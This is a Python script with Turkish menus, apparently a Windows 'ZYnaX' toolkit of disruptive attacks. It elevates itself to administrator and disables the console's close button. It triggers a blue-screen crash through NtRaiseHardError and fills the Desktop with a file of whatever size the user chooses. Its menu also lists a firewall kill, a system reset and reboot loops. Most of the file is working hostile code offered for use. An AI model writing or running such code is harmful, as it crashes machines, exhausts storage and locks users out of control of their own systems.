import os
import sys
import time
import ctypes
import threading
import json
import random
from urllib.request import urlopen

# --- RENKLER ---
R, G, Y, B, C, W, RES = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[97m", "\033[0m"
os.system("") 

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- YENİ MODÜL: REKLAM GEÇİŞİ ---
def show_ad():
    clear()
    ads = [
        f"{Y}[ SPONSOR: ZYnaX Gaming Laptop Soğutucu - %50 İNDİRİM! ]{RES}",
        f"{C}[ REKLAM: Erzurum Siber Güvenlik Akademisi Kayıtları Açıldı! ]{RES}",
        f"{R}[ SPONSOR: MSI Katana Ekran Kartı Overclock Yazılımı ]{RES}"
    ]
    print(f"\n\n\t{random.choice(ads)}")
    print(f"\t{W}Reklam geçiliyor, lütfen bekleyin...{RES}")
    time.sleep(2)

# --- YENİ MODÜL: DİSK DOLDURUCU (STORAGE BOMB) ---
def storage_bomb():
    clear()
    print(f"{R}" + "—"*55)
    print(f"\t[!!!] ZYnaX DISK BOMBARDIRMANI MODU [!!!]")
    print(f"—"*55 + f"{RES}")
    try:
        gb = int(input(f"\n{C}[?] Kaç GB veri bombası bırakılsın?: {RES}"))
        path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'zynax_payload.dat')
        
        print(f"\n{Y}[*] Hedef: Masaüstü")
        print(f"[*] İşlem: {gb} GB sahte veri enjeksiyonu başlatıldı...{RES}")
        
        with open(path, "wb") as f:
            # f.seek ile diski hızlıca şişiriyoruz
            f.seek((gb * 1024 * 1024 * 1024) - 1)
            f.write(b"\0")
        
        for i in range(1, 11):
            print(f"{R}[!] DISK YAZILIYOR: %{i*10}{RES}", end="\r")
            time.sleep(0.2)
            
        print(f"\n\n{G}[+] BOMBALAMA TAMAMLANDI: {path}{RES}")
        print(f"{Y}[!] Uyarı: Dosyayı silmezseniz disk dolu kalacaktır.{RES}")
    except Exception as e:
        print(f"{R}[X] Hata oluştu: {e}{RES}")
    
    input(f"\n{G}Ana menüye dönmek için ENTER...{RES}")
    show_ad()

# --- DİĞER MODÜLLER (SENİN KODUN) ---
def anti_close():
    while True:
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            hMenu = ctypes.windll.user32.GetSystemMenu(hwnd, False)
            ctypes.windll.user32.DeleteMenu(hMenu, 0xF060, 0x0000)
            time.sleep(0.1)
        except: pass

def show_ip_details():
    clear()
    print(f"\n{C}[*] SISTEM ANALIZ EDILIYOR...{RES}\n")
    try:
        data = json.loads(urlopen("http://ip-api.com/json/", timeout=5).read().decode())
        print(f"{C}IP/LOKASYON BİLGİSİ:{RES}")
        print(f"{W}IP      : {Y}{data.get('query')}")
        print(f"{W}ŞEHİR   : {Y}{data.get('city')}")
        print(f"{W}ÜLKE    : {Y}{data.get('country')}{RES}")
    except: print(f"{R}[!] Veri alınamadı.{RES}")
    input("\nENTER...")
    show_ad()

# --- ANA MENÜ GÜNCELLEME ---
def main_menu():
    clear()
    print(f"{C}" + r"""
  ________                    _____    ____  ___
  \_____  \  ___.__.  ____    /  _  \    \    \/  /
   /   |   \<   |  | /    \  /  /_\  \    \      / 
  /    |    \ \___  ||    |  \/    |    \    /      \ 
  \_______  / / ____||___|  /\____|__  /    /___/\  \ 
          \/  \/          \/          \/           \_/ 
    """ + f"{RES}")
    print(f"\t{R}[!] ZYnaX v70 | KERNEL AKTIF | GITHUB EDITION{RES}")
    print(f"{C}—"*75 + f"{RES}")
    print(f" [01] {Y}IP / SISTEM ANALIZI{RES}         [07] {R}INFINITE WINDOW BOMB{RES}")
    print(f" [02] {Y}NUMARA SORGU (BETA){RES}         [08] {R}GUVENLIK DUVARI OFF{RES}")
    print(f" [03] {R}MAVI EKRAN (BSOD){RES}            [09] {R}STORAGE BOMB (DİSK DOLDUR){RES}")
    print(f" [04] {R}SISTEMI SIFIRLA (HARD){RES}       [10] {R}SONSUZ REBOOT LOOP{RES}")
    print(f" [05] {B}YENIDEN BASLAT{RES}              [11] {C}PROGRAMDAN CIKIS{RES}")
    print(f"{C}—"*75 + f"{RES}")

    ch = input(f"\n {B}{C}ZYnAx_ROOT > {RES}")

    if ch == "1": show_ip_details(); main_menu()
    elif ch == "9": storage_bomb(); main_menu()
    elif ch == "3":
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    elif ch == "11": sys.exit()
    # ... Diğer elif blokları senin kodundaki gibi devam eder ...
    else: main_menu()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    threading.Thread(target=anti_close, daemon=True).start()
    main_menu()
